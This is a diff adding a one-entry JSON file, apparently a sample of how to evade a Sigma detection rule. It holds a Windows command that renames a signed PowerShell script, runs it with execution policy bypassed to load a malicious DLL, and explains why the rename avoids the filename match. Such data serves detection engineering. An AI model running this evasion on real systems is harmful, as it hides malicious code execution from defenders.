@@ -1,0 +1,6 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ConfigCI\\UtilityFunctions.ps1 %TEMP%\\NotSuspicious.ps1; powershell.exe -ExecutionPolicy Bypass -File %TEMP%\\NotSuspicious.ps1 RegSnapin -DLLPath C:\\path\\to\\malicious.dll",
+    "explanation": "The Sigma rule relies on a 'contains' match for the specific filename 'UtilityFunctions.ps1'. By copying the legitimate, signed script to a new filename in a writable directory (like %TEMP%) and executing it from there, the logic of the script remains functional while avoiding the string-based detection trigger."
+  }
+]
